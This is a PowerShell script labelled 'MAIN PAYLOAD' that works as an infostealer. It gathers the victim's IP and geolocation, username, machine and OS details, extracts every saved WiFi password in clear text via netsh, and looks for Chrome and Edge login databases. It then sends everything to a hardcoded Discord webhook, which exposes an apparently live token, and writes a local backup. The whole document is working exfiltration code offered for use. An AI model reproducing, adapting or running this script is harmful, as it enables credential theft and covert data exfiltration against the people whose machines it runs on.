# MAIN PAYLOAD - System Info + Password Extraction

Write-Host "================================" -ForegroundColor Cyan
Write-Host "Data Collection Script" -ForegroundColor Cyan
Write-Host "================================" -ForegroundColor Cyan

# Get public IP and location
Write-Host "`n[1/6] Fetching public IP and location..." -ForegroundColor Yellow
try {
    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"
    $ip = $ipInfo.query
    $country = $ipInfo.country
    $city = $ipInfo.city
    $region = $ipInfo.regionName
    Write-Host "      IP: $ip" -ForegroundColor Green
    Write-Host "      Location: $city, $region, $country" -ForegroundColor Green
} catch {
    $ip = "Unable to fetch"
    $country = "Unknown"
    $city = "Unknown"
    $region = "Unknown"
    Write-Host "      Failed to get IP: $($_.Exception.Message)" -ForegroundColor Red
}

# Get username
Write-Host "`n[2/6] Getting username..." -ForegroundColor Yellow
$user = $env:USERNAME
Write-Host "      User: $user" -ForegroundColor Green

# Get machine info
Write-Host "`n[3/6] Getting OS info..." -ForegroundColor Yellow
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$computer = $env:COMPUTERNAME
Write-Host "      Computer: $computer" -ForegroundColor Green
Write-Host "      OS: $os" -ForegroundColor Green

# Get time
Write-Host "`n[4/6] Getting timestamp..." -ForegroundColor Yellow
$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
Write-Host "      Time: $time" -ForegroundColor Green

# Extract WiFi Passwords
Write-Host "`n[5/6] Extracting WiFi passwords..." -ForegroundColor Yellow
$wifiData = ""
try {
    $profiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
    foreach ($profile in $profiles) {
        $password = (netsh wlan show profile name="$profile" key=clear) | Select-String "Key Content\W+\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
        if ($password) {
            $wifiData += "`n      📶 $profile : $password"
        }
    }
    if ($wifiData) {
        Write-Host "      Found WiFi passwords!" -ForegroundColor Green
    } else {
        Write-Host "      No WiFi passwords found" -ForegroundColor Yellow
        $wifiData = "`n      No saved WiFi networks found"
    }
} catch {
    Write-Host "      Failed to extract WiFi passwords" -ForegroundColor Red
    $wifiData = "`n      WiFi extraction failed"
}

# Check for browser password databases
Write-Host "`n[6/6] Checking for browser passwords..." -ForegroundColor Yellow
$browserData = ""
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"

if (Test-Path $chromePath) {
    $chromeSize = (Get-Item $chromePath).Length / 1KB
    $browserData += "`n      🌐 Chrome: Login database found ($([math]::Round($chromeSize, 2)) KB)"
    Write-Host "      Chrome passwords detected" -ForegroundColor Green
}

if (Test-Path $edgePath) {
    $edgeSize = (Get-Item $edgePath).Length / 1KB
    $browserData += "`n      🌐 Edge: Login database found ($([math]::Round($edgeSize, 2)) KB)"
    Write-Host "      Edge passwords detected" -ForegroundColor Green
}

if (-not $browserData) {
    $browserData = "`n      No browser password databases found"
    Write-Host "      No browser passwords found" -ForegroundColor Yellow
}

# Compose Discord message
$message = @"
**🚨 New Connection**
:clock1: **Time:** $time
:computer: **Computer:** $computer
:bust_in_silhouette: **User:** $user
:desktop: **OS:** $os
:globe_with_meridians: **IP:** $ip
:flag_$($country.ToLower().Substring(0,2).Replace(' ','')): **Location:** $city, $region, $country

**📡 WiFi Networks:**$wifiData

**🔐 Browser Data:**$browserData
"@

# Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"

Write-Host "`n[*] Sending to Discord..." -ForegroundColor Yellow

# Create JSON payload
$payload = @{
    content = $message
} | ConvertTo-Json

# Send to Discord
try {
    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
    Write-Host "`n================================" -ForegroundColor Green
    Write-Host "SUCCESS! Data sent to Discord!" -ForegroundColor Green
    Write-Host "================================" -ForegroundColor Green
} catch {
    Write-Host "`n================================" -ForegroundColor Red
    Write-Host "FAILED TO SEND!" -ForegroundColor Red
    Write-Host "================================" -ForegroundColor Red
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}

# Save backup locally
Write-Host "`nSaving backup locally..." -ForegroundColor Yellow
$doc = [Environment]::GetFolderPath("MyDocuments")
$out = Join-Path $doc "system_info.txt"
$message | Out-File $out -Encoding UTF8
Write-Host "Backup saved to: $out" -ForegroundColor Green
